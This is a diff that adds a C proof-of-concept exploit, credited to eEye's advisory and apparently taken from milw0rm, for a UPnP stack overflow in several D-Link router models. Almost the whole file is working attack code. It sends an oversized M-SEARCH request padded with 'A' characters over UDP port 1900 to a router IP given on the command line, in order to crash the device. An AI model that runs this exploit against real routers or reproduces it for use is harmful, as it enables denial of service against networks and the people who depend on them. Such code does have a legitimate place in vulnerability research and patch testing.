@@ -1,0 +1,87 @@
+/* routers affected from eEye's advisory. /str0ke
+Routers Affected:
+DI-524 Rev A
+DI-524 Rev C
+DI-524 Rev D
+DI-604 Rev E
+DI-624 Rev C
+DI-624 Rev D
+DI-784 Rev A
+EBR-2310 Rev A
+WBR-1310 Rev A
+WBR-2310 Rev A
+*/
+
+/*
+ * D-Link Router UPNP DOS PoC
+ * Written By: ub3rst4r aka DiGiTALST*R
+ * Tested Against: DI-524 Rev. A
+ *
+ * A remote stack overflow exists in a range of wired and wireless D-Link 
+ * routers. This vulnerability allows an attacker to execute privileged code
+ * on an affected device. Although a stack overflow does exist, debugging this 
+ * vulnerabilty requires additional external hardware.
+ * 
+ * NOTE: You might need to try sending this twice, or use 239.255.255.250
+ *
+ * Credits: eEye Digital Security
+ *
+ */
+
+#include <stdio.h>
+#include <windows.h>
+#pragma comment(lib,"ws2_32")
+
+int main(int argc, char **argv)
+{
+    WSADATA wsa;
+
+    char buf[896];
+    
+    int sockfd;
+    struct sockaddr_in serv_addr;
+
+    int ret;
+    
+    if (argc < 2) {
+        printf("Usage: dlinkdos <router ip>\n");
+        return 0;
+    }
+    
+    WSAStartup(MAKEWORD(1,1), &wsa);
+
+    // the main string
+    memcpy(buf, "M-SEARCH ", 9);
+    memset(buf+9, 'A', 800);
+    memcpy(buf+809, " HTTP/1.1\r\n", 10);
+    
+    // extra data
+    strcat(buf,
+        "Host:239.255.255.250:1900\r\n"
+        "ST:upnp:rootdevice\r\n"
+        "Man:\"ssdp:discover\"\r\n"
+        "MX:3\r\n"
+        "\r\n"
+        "\r\n");
+
+    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+    
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(1900);
+    serv_addr.sin_addr.s_addr = inet_addr(argv[1]);
+    memset(&serv_addr.sin_zero, '\0', 8);
+                     
+    ret = sendto(sockfd,buf,sizeof(buf),0,(struct sockaddr *)&serv_addr, sizeof(struct sockaddr));
+    if (ret <= 0) {
+        printf("failed to send request\n");
+        return 0;
+    } 
+    
+    printf("request sent!\n");
+    
+    WSACleanup();
+    
+    return 0;
+}
+
+// milw0rm.com [2006-07-22]
